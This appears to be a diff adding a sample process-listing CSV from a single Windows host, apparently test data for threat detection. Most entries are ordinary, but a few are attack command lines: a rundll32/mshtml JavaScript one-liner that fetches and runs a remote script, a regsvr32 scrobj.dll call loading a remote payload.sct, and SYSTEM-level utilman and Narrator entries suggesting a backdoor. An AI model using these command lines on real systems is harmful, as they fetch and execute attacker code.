@@ -1,0 +1,74 @@
+,arguments,hostname,name,path,pid,username
+0,"""C:\\Program Files\\Common Files\\McAfee\ModuleCore\\ProtectedModuleHost.exe""",0003FXGWL,ProtectedModuleHost.exe,C:\Program Files\Common Files\McAfee\ModuleCore,4756,islfoste
+1,"""C:\Program Files\Common Files\mcafee\Platform\mcuicnt.exe"" ""C:\Program Files\Common Files\McAfee\ActWiz\mcactwiz.dll"" nosplash:",0003FXGWL,mcuicnt.exe,C:\Program Files\Common Files\mcafee\Platform,2765,islfoste
+2,"""C:\Program Files\Microsoft SQL Server\MSSQL14.SQLEXPRESS\MSSQL\Binn\sqlservr.exe"" -sSQLEXPRESS",0003FXGWL,sqlservr.exe,C:\Program Files\Microsoft SQL Server\MSSQL14.SQLEXPRESS\MSSQL\Binn,2455,emil.benne
+3,"""C:\Users\will.lon\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --start-maximized --ran-launcher",0003FXGWL,opera.exe,C:\Users\will.lon\AppData\Local\Programs\Opera\56.0.3051.52,5986,will.lon
+4,"C:\WINDOWS\system32\cmd.exe /c """"C:\Ruby24-x64\bin\irb.cmd"" """,0003FXGWL,cmd.exe,C:\WINDOWS\system32,4296,islfoste
+5,"""C:\Program Files\McAfee\MAT\McPvTray.exe""",0003FXGWL,McPvTray.exe,C:\Program Files\McAfee\MAT,2977,islfoste
+6,"""C:\Program Files\Common Files\McAfee\TaskScheduler\McAMTaskAgent.exe"" -Embedding",0003FXGWL,McAMTaskAgent.exe,C:\Program Files\Common Files\McAfee\TaskScheduler,1190,islfoste
+7,"""C:\Program Files\CCleaner\CCleaner.exe"" /uac",0003FXGWL,CCleaner64.exe,C:\Program Files\CCleaner,2675,emil.benne
+8,C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted,0003FXGWL,svchost.exe,C:\Windows\System32,1596,NT AUTHORITY\SYSTEM
+9,C:\Windows\System32\svchost.exe -k termsvcs,0003FXGWL,svchost.exe,C:\Windows\System32,2060,NT AUTHORITY\SYSTEM
+10,"""c:\program files\common files\mcafee\modulecore\modulecoreservice.exe""",0003FXGWL,modulecoreservice.exe,c:\program files\common files\mcafee\modulecore,1740,islfoste
+11,"""C:\Users\will.lon\AppData\Local\Microsoft\OneDrive\OneDrive.exe"" ",0003FXGWL,OneDrive.exe,C:\Users\will.lon\AppData\Local\Microsoft\OneDrive,5607,will.lon
+12,"""C:\Program Files\CCleaner\CCleaner.exe"" /MONITOR /uac",0003FXGWL,CCleaner64.exe,C:\Program Files\CCleaner,2278,emil.benne
+13,/loadhooks /Parent:0000000000001188,0003FXGWL,TabTip32.exe,C:\Program Files (x86)\Common Files\Microsoft Shared\Ink,1824,NT AUTHORITY\SYSTEM
+14,\??\C:\Windows\system32\conhost.exe 0x4,0003FXGWL,conhost.exe,C:\Windows\system32,5748,NT AUTHORITY\SYSTEM
+16,,,utilman.exe,C:\Windows\System32\utilman.exe,4252,NT AUTHORITY\SYSTEM
+17,"""C:\Users\will.lon\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --type=renderer --field-trial-handle=1640 14609910000652164441 9538679763400238678 131072 --service-pipe-token=12376823585177401963 --lang=en-GB --extension-process --enable-offline-auto-reload --enable-offline-auto-reload-visible-only --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --device-scale-factor=1.5 --num-raster-threads=2 --enable-main-frame-before-activation --service-request-channel-token=12376823585177401963 --renderer-client-id=7 --mojo-platform-channel-handle=2368 /prefetch:1",0003FXGWL,opera.exe,C:\Users\will.lon\AppData\Local\Programs\Opera\56.0.3051.52,506,will.lon
+18,"""C:\Users\will.lon\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --type=renderer --field-trial-handle=1640 14609910000652164441 9538679763400238678 131072 --service-pipe-token=16451249972883912486 --lang=en-GB --extension-process --enable-offline-auto-reload --enable-offline-auto-reload-visible-only --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --device-scale-factor=1.5 --num-raster-threads=2 --enable-main-frame-before-activation --service-request-channel-token=16451249972883912486 --renderer-client-id=4 --mojo-platform-channel-handle=3140 /prefetch:1",0003FXGWL,opera.exe,C:\Users\will.lon\AppData\Local\Programs\Opera\56.0.3051.52,4153,will.lon
+19,C:\Windows\system32\svchost.exe -k DcomLaunch,0003FXGWL,svchost.exe,C:\Windows\system32,3856,NT AUTHORITY\SYSTEM
+20,"""LogonUI.exe"" /flags:0x0 /state0:0xa3a5d855 /state1:0x41c64e6d",0003FXGWL,LogonUI.exe,C:\Windows\system32,5512,NT AUTHORITY\SYSTEM
+21,"""C:\Users\will.lon\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --type=gpu-process --field-trial-handle=1640 14609910000652164441 9538679763400238678 131072 --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --gpu-preferences=KAAAAAAAAACAAwBAAQAAAAAAAAAAAGAAAAAAAAAAAAAIAAAAAAAAACgAAAAEAAAAIAAAAAAAAAAoAAAAAAAAADAAAAAAAAAAOAAAAAAAAAAQAAAAAAAAAAAAAAAKAAAAEAAAAAAAAAAAAAAACwAAABAAAAAAAAAAAQAAAAoAAAAQAAAAAAAAAAEAAAALAAAA --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --service-request-channel-token=7207758415534163028 --mojo-platform-channel-handle=1472 --ignored="" --type=renderer "" /prefetch:2",0003FXGWL,opera.exe,C:\Users\will.lon\AppData\Local\Programs\Opera\56.0.3051.52,5359,will.lon
+22,C:\Windows\system32\svchost.exe -k RPCSS,0003FXGWL,svchost.exe,C:\Windows\system32,3260,NT AUTHORITY\SYSTEM
+23,sihost.exe,0003FXGWL,sihost.exe,C:\Windows\System32,6060,NT AUTHORITY\SYSTEM
+25,C:\Windows\system32\svchost.exe -k NetworkService,0003FXGWL,svchost.exe,C:\Windows\system32,5192,NT AUTHORITY\SYSTEM
+26,"""C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe"" -ServerName:App.AppXtk181tbxbce2qsex02s8tw7hfxa9xb3t.mca",0003FXGWL,ShellExperienceHost.exe,C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy,2436,NT AUTHORITY\SYSTEM
+27,"C:\Users\will.lon\AppData\Local\Programs\Opera\56.0.3051.52\opera_crashreporter.exe --type=crashpad-handler /prefetch:7 --monitor-self-annotation=ptype=crashpad-handler ""--database=C:\Users\will.lon\AppData\Roaming\Opera Software\Opera Stable\Crash Reports"" ""--crash-count-file=C:\Users\will.lon\AppData\Roaming\Opera Software\Opera Stable\crash_count.txt"" --url=https://crashstats-collector.opera.com/collector/submit --annotation=channel=Stable --annotation=plat=Win64 --annotation=prod=OperaDesktop --annotation=ver=56.0.3051.52 --initial-client-data=0x238 0x304 0x30c 0x320 0x308 0x7ffb51313108 0x7ffb51313118 0x7ffb51313128",0003FXGWL,opera_crashreporter.exe,C:\Users\will.lon\AppData\Local\Programs\Opera\56.0.3051.52,4624,will.lon
+28,C:\Windows\system32\dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235},0003FXGWL,dllhost.exe,C:\Windows\system32,3208,NT AUTHORITY\SYSTEM
+29,"""C:\Ruby24-x64\bin\ruby.exe"" ",0003FXGWL,ruby.exe,C:\Ruby24-x64\bin,6338,islfoste
+30,"""C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe"" -ServerName:CortanaUI.AppXa50dqqa5gqv4a428c9y1jjw7m3btvepj.mca",0003FXGWL,SearchUI.exe,C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy,864,NT AUTHORITY\SYSTEM
+31,C:\Windows\system32\svchost.exe -k LocalService,0003FXGWL,svchost.exe,C:\Windows\system32,4500,NT AUTHORITY\SYSTEM
+32,"""C:\Program Files\CCleaner\CCleaner.exe"" /uac",0003FXGWL,CCleaner64.exe,C:\Program Files\CCleaner,735,will.lon
+33,"""dwm.exe""",0003FXGWL,dwm.exe,C:\Windows\system32,4720,NT AUTHORITY\SYSTEM
+34,"""C:\Program Files\McAfee\WebAdvisor\ServiceHost.exe""",0003FXGWL,ServiceHost.exe,C:\Program Files\McAfee\WebAdvisor,6464,islfoste
+35,C:\Windows\system32\lsass.exe,0003FXGWL,lsass.exe,C:\Windows\system32,4928,NT AUTHORITY\SYSTEM
+37,C:\Windows\system32\svchost.exe -k appmodel,0003FXGWL,svchost.exe,C:\Windows\system32,1884,NT AUTHORITY\SYSTEM
+39,"""C:\Program Files\CCleaner\CCleaner.exe"" /MONITOR /uac",0003FXGWL,CCleaner64.exe,C:\Program Files\CCleaner,5090,will.lon
+40,"""C:\Program Files\Common Files\McAfee\VSCore_18_6\McApExe.exe""",0003FXGWL,McApExe.exe,C:\Program Files\Common Files\McAfee\VSCore_18_6,6126,islfoste
+41,C:\Windows\System32\svchost.exe -k netsvcs,0003FXGWL,svchost.exe,C:\Windows\System32,176,NT AUTHORITY\SYSTEM
+42,"""C:\Program Files\McAfee\MfeAV\MFEAvSvc.exe""",0003FXGWL,MFEAvSvc.exe,C:\Program Files\McAfee\MfeAV,6005,islfoste
+43,"""dwm.exe""",0003FXGWL,dwm.exe,C:\Windows\system32,1656,NT AUTHORITY\SYSTEM
+44,"C:\Windows\System32\rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:\http://www.Ш3.com/netlgn.js'"").Exec();""",0003FXGWL,rundll32.exe,C:\Windows\System32\rundll32.exe,592,darc.flore1
+45,C:\ProgramData\McAfee\McInstruTrack\McInstruTrack.exe /SP:0,0003FXGWL,McInstruTrack.exe,C:\ProgramData\McAfee\McInstruTrack,2531,islfoste
+46,C:\Windows\System32\svchost.exe -k smbsvcs,0003FXGWL,svchost.exe,C:\Windows\System32,1580,NT AUTHORITY\SYSTEM
+47,C:\ProgramData\McAfee\Direct\McDiReg.exe -MONITOR_PI2 9508,0003FXGWL,McDiReg.exe,C:\ProgramData\McAfee\Direct,5463,islfoste
+48,"""C:\ProgramData\McAfee\Direct\McDiReg.exe"" ",0003FXGWL,McDiReg.exe,C:\ProgramData\McAfee\Direct,4186,islfoste
+49,C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted,0003FXGWL,svchost.exe,C:\Windows\System32,3688,NT AUTHORITY\SYSTEM
+50,"""C:\Program Files\McAfee\WebAdvisor\UIHost.exe"" ",0003FXGWL,UIHost.exe,C:\Program Files\McAfee\WebAdvisor,1303,islfoste
+51,C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted,0003FXGWL,svchost.exe,C:\Windows\system32,3576,NT AUTHORITY\SYSTEM
+53,C:\Windows\system32\svchost.exe -k UnistackSvcGroup,0003FXGWL,svchost.exe,C:\Windows\system32,2932,NT AUTHORITY\SYSTEM
+54,"""C:\Program Files\Common Files\McAfee\Platform\Core\mchost.exe"" {e05dd3fd-ba47-4235-85a5-3789db83c8e1} /pid=444",0003FXGWL,mchost.exe,C:\Program Files\Common Files\McAfee\Platform\Core,872,islfoste
+55,ModuleCoreService.exe /startUserModeHosting=4_TIME_TO_DIE,0003FXGWL,ModuleCoreService.exe,c:\program files\common files\mcafee\modulecore,6033,islfoste
+56,C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation,0003FXGWL,svchost.exe,C:\Windows\system32,6496,NT AUTHORITY\SYSTEM
+59,"""C:\Program Files\Common Files\McAfee\CSP\3.0.127.0\\McCSPServiceHost.exe""",0003FXGWL,McCSPServiceHost.exe,C:\Program Files\Common Files\McAfee\CSP\3.0.127.0,5553,islfoste
+60,"""C:\Users\will.lon\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --type=renderer --field-trial-handle=1640 14609910000652164441 9538679763400238678 131072 --service-pipe-token=2685998191293934672 --lang=en-GB --enable-offline-auto-reload --enable-offline-auto-reload-visible-only --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --device-scale-factor=1.5 --num-raster-threads=2 --enable-main-frame-before-activation --service-request-channel-token=2685998191293934672 --renderer-client-id=12 --mojo-platform-channel-handle=4360 /prefetch:1",0003FXGWL,opera.exe,C:\Users\will.lon\AppData\Local\Programs\Opera\56.0.3051.52,851,will.lon
+66,"""C:\Program Files\Common Files\McAfee\MMSSHost\MMSSHOST.EXE"" MMSCOM homenetsvc",0003FXGWL,MMSSHOST.EXE,C:\Program Files\Common Files\McAfee\MMSSHost,534,islfoste
+70,C:\Windows\System32\spoolsv.exe,0003FXGWL,spoolsv.exe,C:\Windows\System32,5072,NT AUTHORITY\SYSTEM
+74,C:\Windows\System32\msdtc.exe,0003FXGWL,msdtc.exe,C:\Windows\System32,6348,NT AUTHORITY\SYSTEM
+75,C:\Windows\Explorer.EXE,0003FXGWL,Explorer.EXE,C:\Windows,6024,NT AUTHORITY\SYSTEM
+76,,0003FXGWL,Narrator.exe,C:\Windows\System32\Narrator.exe,984,NT AUTHORITY\SYSTEM
+77,C:\Windows\system32\svchost.exe -k NetworkServiceNetworkRestricted,0003FXGWL,svchost.exe,C:\Windows\system32,5400,NT AUTHORITY\SYSTEM
+81,"""C:\Program Files\Common Files\McAfee\AMCore\mcshield.exe""",0003FXGWL,mcshield.exe,C:\Program Files\Common Files\McAfee\AMCore,4949,islfoste
+86,taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E},0003FXGWL,taskhostw.exe,C:\Windows\System32,28,NT AUTHORITY\SYSTEM
+88,C:\Windows\System32\svchost.exe -k utcsvc,0003FXGWL,svchost.exe,C:\Windows\System32,504,NT AUTHORITY\SYSTEM
+93,C:\Windows\system32\dllhost.exe /Processid:{A7CCA429-5F8F-4A5B-B524-82C38D561286},0003FXGWL,dllhost.exe,C:\Windows\system32,5924,NT AUTHORITY\SYSTEM
+94,C:\Windows\System32\RuntimeBroker.exe -Embedding,0003FXGWL,RuntimeBroker.exe,C:\Windows\System32,3456,NT AUTHORITY\SYSTEM
+96,"""C:\Program Files\Common Files\McAfee\PEF\CORE\PEFService.exe""",0003FXGWL,PEFService.exe,C:\Program Files\Common Files\McAfee\PEF\CORE,1529,islfoste
+102,C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork,0003FXGWL,svchost.exe,C:\Windows\system32,2016,NT AUTHORITY\SYSTEM
+104,"""C:\Users\will.lon\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --type=renderer --field-trial-handle=1640 14609910000652164441 9538679763400238678 131072 --service-pipe-token=6930244878569528683 --lang=en-GB --extension-process --enable-offline-auto-reload --enable-offline-auto-reload-visible-only --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --device-scale-factor=1.5 --num-raster-threads=2 --enable-main-frame-before-activation --service-request-channel-token=6930244878569528683 --renderer-client-id=3 --mojo-platform-channel-handle=2904 /prefetch:1",0003FXGWL,opera.exe,C:\Users\will.lon\AppData\Local\Programs\Opera\56.0.3051.52,911,will.lon
+109,"""C:\Users\islfoste\AppData\Local\Temp\scoped_dir9616_4071\mcafee_trial_setup_433.0207.3919_key.exe"" ",0003FXGWL,mcafee_trial_setup_433.0207.3919_key.exe,C:\Users\islfoste\AppData\Local\Temp\scoped_dir9616_4071,3381,islfoste
+118,C:\Windows\System32\regsvr32 /u /n /s /i:\webdavserver\folder\payload.sct scrobj.dll,0003FXGWL,wscript.exe,C:\Windows\System32\wscript.exe,3040,NT AUTHORITY\SYSTEM
+119,"""C:\Program Files\Windows Defender\\MpCmdRun.exe"" SpyNetServiceDss -RestrictPrivileges -AccessKey 5BDCBEBD-E077-6957-0484-82901932C7EC -Reinvoke",0003FXGWL,MpCmdRun.exe,C:\Program Files\Windows Defender,4864,NT AUTHORITY\SYSTEM
+121,winlogon.exe,0003FXGWL,winlogon.exe,C:\Windows\system32,3360,NT AUTHORITY\SYSTEM
+123,winlogon.exe,0003FXGWL,winlogon.exe,C:\Windows\system32,6256,NT AUTHORITY\SYSTEM
